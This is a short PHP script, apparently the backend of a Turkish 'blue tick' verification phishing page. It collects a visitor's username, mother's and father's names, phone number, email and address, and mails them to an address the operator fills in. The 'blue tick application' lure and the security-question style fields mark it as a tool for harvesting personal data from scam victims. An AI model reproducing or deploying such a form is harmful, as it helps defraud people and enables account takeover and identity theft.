<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $mother_name = $_POST['mother_name'];
    $father_name = $_POST['father_name'];
    $phone_number = $_POST['phone_number'];
    $email = $_POST['email'];
    $address = $_POST['address'];

    $to = 'your-email@example.com'; // Alıcı e-posta adresini buraya yazın
    $subject = 'Yeni Mavi Tik Başvurusu';
    $message = "Kullanıcı Adı: $username\nAnne Adı: $mother_name\nBaba Adı: $father_name\nTelefon Numarası: $phone_number\nEmail: $email\nAdres: $address";
    $headers = 'From: no-reply@example.com' . "\r\n" .
               'Reply-To: no-reply@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo json_encode(['status' => 'success', 'message' => 'Bilgiler başarıyla gönderildi.']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Bilgiler gönderilemedi.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Geçersiz istek.']);
}
?>
